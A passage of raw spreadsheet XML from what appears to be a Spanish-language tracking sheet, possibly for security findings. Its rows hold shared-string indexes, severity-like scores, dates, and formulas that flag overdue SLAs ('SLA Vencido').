      <c r="AB300" s="9" t="s">
        <v>1258</v>
      </c>
      <c r="AC300" s="45" t="s">
        <v>1259</v>
      </c>
      <c r="AD300" s="32" t="s">
        <v>1260</v>
      </c>
      <c r="AE300" s="27"/>
      <c r="AF300" s="9"/>
      <c r="AG300" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH300" t="str">
        <f>IFERROR(VLOOKUP(H300,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="301" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A301" s="5">
        <v>300</v>
      </c>
      <c r="B301" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C301" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D301" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E301" s="4"/>
      <c r="F301" s="4"/>
      <c r="G301" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H301" s="4"/>
      <c r="I301" s="4"/>
      <c r="J301" s="4" t="s">
        <v>1261</v>
      </c>
      <c r="K301" s="4"/>
      <c r="L301" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M301" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N301" s="5"/>
      <c r="O301" s="6"/>
      <c r="P301" s="6"/>
      <c r="Q301" s="4" t="s">
        <v>176</v>
      </c>
      <c r="R301" s="4"/>
      <c r="S301" s="22"/>
      <c r="T301" s="8">
        <v>45573</v>
      </c>
      <c r="U301" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>636</v>
      </c>
      <c r="V301" s="8">
        <f t="shared" si="13"/>
        <v>45693</v>
      </c>
      <c r="W301" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X301" s="11"/>
      <c r="Y301" s="11"/>
      <c r="Z301" s="11"/>
      <c r="AA301" s="8">
        <v>45686</v>
      </c>
      <c r="AB301" s="9" t="s">
        <v>1262</v>
      </c>
      <c r="AC301" s="45" t="s">
        <v>1263</v>
      </c>
      <c r="AD301" s="32" t="s">
        <v>1264</v>
      </c>
      <c r="AE301" s="27"/>
      <c r="AF301" s="9"/>
      <c r="AG301" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH301" t="str">
        <f>IFERROR(VLOOKUP(H301,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="302" spans="1:34" ht="72.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A302" s="5">
        <v>301</v>
      </c>
      <c r="B302" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C302" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D302" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E302" s="4"/>
      <c r="F302" s="4"/>
      <c r="G302" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H302" s="4" t="s">
        <v>1265</v>
      </c>
      <c r="I302" s="4" t="s">
        <v>1266</v>
      </c>
      <c r="J302" s="4" t="s">
        <v>870</v>
      </c>
      <c r="K302" s="4"/>
      <c r="L302" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M302" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N302" s="5">
        <v>4</v>
      </c>
      <c r="O302" s="6"/>
      <c r="P302" s="6"/>
      <c r="Q302" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R302" s="4"/>
      <c r="S302" s="22"/>
      <c r="T302" s="8">
        <v>45573</v>
      </c>
      <c r="U302" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>636</v>
      </c>
      <c r="V302" s="8">
        <f t="shared" si="13"/>
        <v>45663</v>
      </c>
      <c r="W302" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X302" s="11"/>
      <c r="Y302" s="11"/>
      <c r="Z302" s="11"/>
      <c r="AA302" s="8"/>
      <c r="AB302" s="9" t="s">
        <v>1267</v>
      </c>
      <c r="AC302" s="45" t="s">
        <v>1170</v>
      </c>
      <c r="AD302" s="32" t="s">
        <v>1216</v>
      </c>
      <c r="AE302" s="27" t="s">
        <v>1268</v>
      </c>
      <c r="AF302" s="9"/>
      <c r="AG302" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH302" t="str">
        <f>IFERROR(VLOOKUP(H302,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="303" spans="1:34" ht="246.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A303" s="5">
        <v>302</v>
      </c>
      <c r="B303" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C303" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D303" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E303" s="4"/>
      <c r="F303" s="4"/>
      <c r="G303" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H303" s="4" t="s">
        <v>1269</v>
      </c>
      <c r="I303" s="4" t="s">
        <v>1270</v>
      </c>
      <c r="J303" s="4" t="s">
        <v>1271</v>
      </c>
      <c r="K303" s="4"/>
      <c r="L303" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M303" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N303" s="5">
        <v>3.8</v>
      </c>
      <c r="O303" s="6"/>
      <c r="P303" s="6"/>
      <c r="Q303" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R303" s="4"/>
      <c r="S303" s="22"/>
      <c r="T303" s="8">
        <v>45573</v>
      </c>
      <c r="U303" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>636</v>
      </c>
      <c r="V303" s="8">
        <f t="shared" si="13"/>
        <v>45663</v>
      </c>
      <c r="W303" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X303" s="11"/>
      <c r="Y303" s="11"/>
      <c r="Z303" s="11"/>
      <c r="AA303" s="8"/>
      <c r="AB303" s="9" t="s">
        <v>1272</v>
      </c>
      <c r="AC303" s="45" t="s">
        <v>1273</v>
      </c>
      <c r="AD303" s="32" t="s">
        <v>1274</v>
      </c>
      <c r="AE303" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF303" s="9"/>
      <c r="AG303" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH303" t="str">
        <f>IFERROR(VLOOKUP(H303,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="304" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A304" s="5">
        <v>303</v>
      </c>
      <c r="B304" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C304" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D304" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E304" s="4"/>
      <c r="F304" s="4"/>
      <c r="G304" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H304" s="4" t="s">
        <v>1275</v>
      </c>
      <c r="I304" s="4" t="s">
        <v>1276</v>
      </c>
      <c r="J304" s="4" t="s">
        <v>1186</v>
      </c>
      <c r="K304" s="4"/>
      <c r="L304" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M304" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N304" s="5">
        <v>2.8</v>
      </c>
      <c r="O304" s="6"/>
      <c r="P304" s="6"/>
      <c r="Q304" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R304" s="4"/>
      <c r="S304" s="22"/>
      <c r="T304" s="8">
        <v>45573</v>
      </c>
      <c r="U304" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>636</v>
      </c>
      <c r="V304" s="8">
        <f t="shared" si="13"/>
        <v>45693</v>
      </c>
      <c r="W304" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X304" s="11"/>
      <c r="Y304" s="11"/>
      <c r="Z304" s="11"/>
      <c r="AA304" s="8"/>
      <c r="AB304" s="9" t="s">
        <v>1277</v>
      </c>
      <c r="AC304" s="45" t="s">
        <v>1278</v>
      </c>
      <c r="AD304" s="32" t="s">
        <v>1189</v>
      </c>
      <c r="AE304" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF304" s="9"/>
      <c r="AG304" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH304" t="str">
        <f>IFERROR(VLOOKUP(H304,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="305" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A305" s="5">
        <v>304</v>
      </c>
      <c r="B305" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C305" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D305" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E305" s="4"/>
      <c r="F305" s="4"/>
      <c r="G305" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H305" s="4" t="s">
        <v>1279</v>
      </c>
      <c r="I305" s="4" t="s">
        <v>1280</v>
      </c>
      <c r="J305" s="4" t="s">
        <v>1192</v>
      </c>
      <c r="K305" s="4"/>
      <c r="L305" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M305" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N305" s="5">
        <v>2.8</v>
      </c>
      <c r="O305" s="6"/>
      <c r="P305" s="6"/>
      <c r="Q305" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R305" s="4"/>
      <c r="S305" s="22"/>
      <c r="T305" s="8">
        <v>45573</v>
      </c>
      <c r="U305" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>636</v>
      </c>
      <c r="V305" s="8">
        <f t="shared" si="13"/>
        <v>45693</v>
      </c>
      <c r="W305" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X305" s="11"/>
      <c r="Y305" s="11"/>
      <c r="Z305" s="11"/>
      <c r="AA305" s="8"/>
      <c r="AB305" s="9" t="s">
        <v>1281</v>
      </c>
      <c r="AC305" s="45" t="s">
        <v>1228</v>
      </c>
      <c r="AD305" s="32" t="s">
        <v>1282</v>
      </c>
      <c r="AE305" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF305" s="9"/>
      <c r="AG305" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH305" t="str">
        <f>IFERROR(VLOOKUP(H305,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="306" spans="1:34" ht="87" hidden="1" x14ac:dyDescent="0.35">
      <c r="A306" s="5">
        <v>305</v>
      </c>
      <c r="B306" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C306" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D306" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E306" s="4"/>
      <c r="F306" s="4"/>
      <c r="G306" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H306" s="4" t="s">
        <v>1283</v>
      </c>
      <c r="I306" s="4" t="s">
        <v>1284</v>
      </c>
      <c r="J306" s="4" t="s">
        <v>1042</v>
      </c>
      <c r="K306" s="4"/>
      <c r="L306" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M306" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N306" s="5">
        <v>3.6</v>
      </c>
      <c r="O306" s="14" t="s">
        <v>1285</v>
      </c>
      <c r="P306" s="6"/>
      <c r="Q306" s="4" t="s">
        <v>176</v>
      </c>
      <c r="R306" s="4"/>
      <c r="S306" s="22"/>
      <c r="T306" s="8">
        <v>45580</v>
      </c>
      <c r="U306" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>629</v>
      </c>
      <c r="V306" s="8">
        <f t="shared" si="13"/>
        <v>45700</v>
      </c>
      <c r="W306" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X306" s="11"/>
      <c r="Y306" s="11"/>
      <c r="Z306" s="11"/>
      <c r="AA306" s="8"/>
      <c r="AB306" s="9" t="s">
        <v>1286</v>
      </c>
      <c r="AC306" s="45" t="s">
        <v>1287</v>
      </c>
      <c r="AD306" s="32" t="s">
        <v>1046</v>
      </c>
      <c r="AE306" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF306" s="9"/>
      <c r="AG306" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH306" t="str">
        <f>IFERROR(VLOOKUP(H306,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="307" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A307" s="5">
        <v>306</v>
      </c>
      <c r="B307" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C307" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D307" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E307" s="4"/>
      <c r="F307" s="4"/>
      <c r="G307" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H307" s="4" t="s">
        <v>1288</v>
      </c>
      <c r="I307" s="4" t="s">
        <v>1289</v>
      </c>
      <c r="J307" s="4" t="s">
        <v>1290</v>
      </c>
      <c r="K307" s="4"/>
      <c r="L307" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M307" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N307" s="5">
        <v>3.4</v>
      </c>
      <c r="O307" s="6"/>
      <c r="P307" s="6"/>
      <c r="Q307" s="4" t="s">
        <v>176</v>
      </c>
      <c r="R307" s="4"/>
      <c r="S307" s="22"/>
      <c r="T307" s="8">
        <v>45580</v>
      </c>
      <c r="U307" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>629</v>
      </c>
      <c r="V307" s="8">
        <f t="shared" si="13"/>
        <v>45700</v>
      </c>
      <c r="W307" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X307" s="11"/>
      <c r="Y307" s="11"/>
      <c r="Z307" s="11"/>
      <c r="AA307" s="8"/>
      <c r="AB307" s="9" t="s">
        <v>1291</v>
      </c>
      <c r="AC307" s="45" t="s">
        <v>1292</v>
      </c>
      <c r="AD307" s="32" t="s">
        <v>1293</v>
      </c>
      <c r="AE307" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF307" s="9"/>
      <c r="AG307" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH307" t="str">
        <f>IFERROR(VLOOKUP(H307,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="308" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A308" s="5">
        <v>307</v>
      </c>
      <c r="B308" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C308" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D308" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E308" s="4"/>
      <c r="F308" s="4"/>
      <c r="G308" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H308" s="4" t="s">
        <v>1294</v>
      </c>
      <c r="I308" s="4" t="s">
        <v>1295</v>
      </c>
      <c r="J308" s="4" t="s">
        <v>1296</v>
      </c>
      <c r="K308" s="4"/>
      <c r="L308" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M308" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N308" s="5">
        <v>3.7</v>
      </c>
      <c r="O308" s="6"/>
      <c r="P308" s="6"/>
      <c r="Q308" s="4" t="s">
        <v>871</v>
      </c>
      <c r="R308" s="4"/>
      <c r="S308" s="22"/>
      <c r="T308" s="8">
        <v>45582</v>
      </c>
      <c r="U308" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>627</v>
      </c>
      <c r="V308" s="8">
        <f t="shared" si="13"/>
        <v>45702</v>
      </c>
      <c r="W308" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X308" s="11"/>
      <c r="Y308" s="11"/>
      <c r="Z308" s="11"/>
      <c r="AA308" s="8"/>
      <c r="AB308" s="9" t="s">
        <v>1297</v>
      </c>
      <c r="AC308" s="45" t="s">
        <v>1298</v>
      </c>
      <c r="AD308" s="32" t="s">
        <v>1299</v>
      </c>
      <c r="AE308" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF308" s="9"/>
      <c r="AG308" s="27" t="s">
        <v>974</v>
      </c>
      <c r="AH308" t="str">
        <f>IFERROR(VLOOKUP(H308,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="309" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A309" s="5">
        <v>308</v>
      </c>
      <c r="B309" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C309" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D309" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E309" s="4"/>
      <c r="F309" s="4"/>
      <c r="G309" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H309" s="9" t="s">
        <v>1300</v>
      </c>
      <c r="I309" s="4" t="s">
        <v>1301</v>
      </c>
      <c r="J309" s="4" t="s">
        <v>1296</v>
      </c>
      <c r="K309" s="4"/>
      <c r="L309" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M309" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N309" s="5">
        <v>3.7</v>
      </c>
      <c r="O309" s="6"/>
      <c r="P309" s="6"/>
      <c r="Q309" s="4" t="s">
        <v>993</v>
      </c>
      <c r="R309" s="4"/>
      <c r="S309" s="22"/>
      <c r="T309" s="8">
        <v>45580</v>
      </c>
      <c r="U309" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>629</v>
      </c>
      <c r="V309" s="8">
        <f t="shared" si="13"/>
        <v>45700</v>
      </c>
      <c r="W309" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X309" s="11"/>
      <c r="Y309" s="11"/>
      <c r="Z309" s="11"/>
      <c r="AA309" s="8"/>
      <c r="AB309" s="9" t="s">
        <v>1297</v>
      </c>
      <c r="AC309" s="45" t="s">
        <v>1298</v>
      </c>
      <c r="AD309" s="32" t="s">
        <v>1299</v>
      </c>
      <c r="AE309" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF309" s="9"/>
      <c r="AG309" s="27" t="s">
        <v>974</v>
      </c>
      <c r="AH309" t="str">
        <f>IFERROR(VLOOKUP(H309,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="310" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A310" s="5">
        <v>309</v>
      </c>
      <c r="B310" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C310" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D310" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E310" s="4"/>
      <c r="F310" s="4"/>
      <c r="G310" s="6" t="s">
        <v>1302</v>
      </c>
      <c r="H310" s="4" t="s">
        <v>1303</v>
      </c>
      <c r="I310" s="4" t="s">
        <v>1304</v>
      </c>
      <c r="J310" s="4" t="s">
        <v>1305</v>
      </c>
      <c r="K310" s="4"/>
      <c r="L310" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M310" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N310" s="5">
        <v>3.9</v>
      </c>
      <c r="O310" s="6"/>
      <c r="P310" s="6"/>
      <c r="Q310" s="4" t="s">
        <v>1302</v>
      </c>
      <c r="R310" s="4"/>
      <c r="S310" s="22"/>
      <c r="T310" s="8">
        <v>45586</v>
      </c>
      <c r="U310" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>623</v>
      </c>
      <c r="V310" s="8">
        <f t="shared" si="13"/>
        <v>45706</v>
      </c>
      <c r="W310" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X310" s="11"/>
      <c r="Y310" s="11"/>
      <c r="Z310" s="11"/>
      <c r="AA310" s="8"/>
      <c r="AB310" s="9" t="s">
        <v>1306</v>
      </c>
      <c r="AC310" s="45" t="s">
        <v>1307</v>
      </c>
      <c r="AD310" s="32" t="s">
        <v>1308</v>
      </c>
      <c r="AE310" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF310" s="9"/>
      <c r="AG310" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH310" t="str">
        <f>IFERROR(VLOOKUP(H310,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="311" spans="1:34" ht="319" hidden="1" x14ac:dyDescent="0.35">
      <c r="A311" s="5">
        <v>310</v>
      </c>
      <c r="B311" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C311" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D311" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E311" s="4"/>
      <c r="F311" s="4"/>
      <c r="G311" s="6" t="s">
        <v>1309</v>
      </c>
      <c r="H311" s="4" t="s">
        <v>1310</v>
      </c>
      <c r="I311" s="4" t="s">
        <v>1311</v>
      </c>
      <c r="J311" s="9" t="s">
        <v>1312</v>
      </c>
      <c r="K311" s="4"/>
      <c r="L311" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M311" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N311" s="5">
        <v>5.3</v>
      </c>
      <c r="O311" s="6"/>
      <c r="P311" s="6" t="s">
        <v>1313</v>
      </c>
      <c r="Q311" s="4" t="s">
        <v>1314</v>
      </c>
      <c r="R311" s="4"/>
      <c r="S311" s="22"/>
      <c r="T311" s="8">
        <v>45609</v>
      </c>
      <c r="U311" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>600</v>
      </c>
      <c r="V311" s="8">
        <f t="shared" si="13"/>
        <v>45699</v>
      </c>
      <c r="W311" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X311" s="11"/>
      <c r="Y311" s="11"/>
      <c r="Z311" s="11"/>
      <c r="AA311" s="8"/>
      <c r="AB311" s="9" t="s">
        <v>1315</v>
      </c>
      <c r="AC311" s="45" t="s">
        <v>1316</v>
      </c>
      <c r="AD311" s="32" t="s">
        <v>1317</v>
      </c>
      <c r="AE311" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF311" s="9"/>
      <c r="AG311" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH311" t="str">
        <f>IFERROR(VLOOKUP(H311,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="312" spans="1:34" ht="246.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A312" s="5">
        <v>311</v>
      </c>
      <c r="B312" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C312" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D312" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E312" s="4"/>
      <c r="F312" s="4"/>
      <c r="G312" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H312" s="4" t="s">
        <v>1318</v>
      </c>
      <c r="I312" s="4" t="s">
        <v>1319</v>
      </c>
      <c r="J312" s="9" t="s">
        <v>1192</v>
      </c>
      <c r="K312" s="4"/>
      <c r="L312" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M312" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N312" s="5"/>
      <c r="O312" s="6"/>
      <c r="P312" s="6"/>
      <c r="Q312" s="4" t="s">
        <v>176</v>
      </c>
      <c r="R312" s="4"/>
      <c r="S312" s="22"/>
      <c r="T312" s="8">
        <v>45636</v>
      </c>
      <c r="U312" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>573</v>
      </c>
      <c r="V312" s="8">
        <f t="shared" si="13"/>
        <v>45756</v>
      </c>
      <c r="W312" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X312" s="11"/>
      <c r="Y312" s="11"/>
      <c r="Z312" s="11"/>
      <c r="AA312" s="8"/>
      <c r="AB312" s="9" t="s">
        <v>1320</v>
      </c>
      <c r="AC312" s="45" t="s">
        <v>1321</v>
      </c>
      <c r="AD312" s="32" t="s">
        <v>1322</v>
      </c>
      <c r="AE312" s="27" t="s">
        <v>147</v>
      </c>
      <c r="AF312" s="9"/>
      <c r="AG312" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH312" t="str">
        <f>IFERROR(VLOOKUP(H312,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="313" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A313" s="5">
        <v>312</v>
      </c>
      <c r="B313" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C313" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D313" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E313" s="4"/>
      <c r="F313" s="4"/>
      <c r="G313" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H313" s="4" t="s">
        <v>1324</v>
      </c>
      <c r="I313" s="4"/>
      <c r="J313" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K313" s="4"/>
      <c r="L313" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M313" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N313" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O313" s="6"/>
      <c r="P313" s="6"/>
      <c r="Q313" s="4" t="s">
        <v>1327</v>
      </c>
      <c r="R313" s="4"/>
      <c r="S313" s="22"/>
      <c r="T313" s="8">
        <v>45632</v>
      </c>
      <c r="U313" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V313" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W313" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X313" s="11"/>
      <c r="Y313" s="11"/>
      <c r="Z313" s="11"/>
      <c r="AA313" s="8"/>
      <c r="AB313" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC313" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD313" s="32"/>
      <c r="AE313" s="27"/>
      <c r="AF313" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG313" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH313" t="str">
        <f>IFERROR(VLOOKUP(H313,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="314" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A314" s="5">
        <v>313</v>
      </c>
      <c r="B314" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C314" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D314" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E314" s="4"/>
      <c r="F314" s="4"/>
      <c r="G314" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H314" s="4" t="s">
        <v>1331</v>
      </c>
      <c r="I314" s="4"/>
      <c r="J314" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K314" s="4"/>
      <c r="L314" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M314" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N314" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O314" s="6"/>
      <c r="P314" s="6"/>
      <c r="Q314" s="4" t="s">
        <v>1332</v>
      </c>
      <c r="R314" s="4"/>
      <c r="S314" s="22"/>
      <c r="T314" s="8">
        <v>45632</v>
      </c>
      <c r="U314" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V314" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W314" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X314" s="11"/>
      <c r="Y314" s="11"/>
      <c r="Z314" s="11"/>
      <c r="AA314" s="8"/>
      <c r="AB314" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC314" s="45" t="s">
        <v>1329</v>
      </c>
      <c r="AD314" s="32"/>
      <c r="AE314" s="27"/>
      <c r="AF314" s="9" t="s">
        <v>1330</v>
      </c>
      <c r="AG314" s="27" t="s">
        <v>969</v>
      </c>
      <c r="AH314" t="str">
        <f>IFERROR(VLOOKUP(H314,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="315" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A315" s="5">
        <v>314</v>
      </c>
      <c r="B315" s="21" t="s">
        <v>32</v>
      </c>
      <c r="C315" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D315" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E315" s="4"/>
      <c r="F315" s="4"/>
      <c r="G315" s="6" t="s">
        <v>1323</v>
      </c>
      <c r="H315" s="4" t="s">
        <v>1333</v>
      </c>
      <c r="I315" s="4"/>
      <c r="J315" s="9" t="s">
        <v>1325</v>
      </c>
      <c r="K315" s="4"/>
      <c r="L315" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M315" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N315" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O315" s="6"/>
      <c r="P315" s="6"/>
      <c r="Q315" s="4" t="s">
        <v>1334</v>
      </c>
      <c r="R315" s="4"/>
      <c r="S315" s="22"/>
      <c r="T315" s="8">
        <v>45632</v>
      </c>
      <c r="U315" s="11">
        <f t="shared" ca="1" si="12"/>
        <v>577</v>
      </c>
      <c r="V315" s="8">
        <f t="shared" si="13"/>
        <v>45722</v>
      </c>
      <c r="W315" s="12" t="str">
        <f t="shared" ca="1" si="14"/>
        <v>SLA Vencido</v>
      </c>
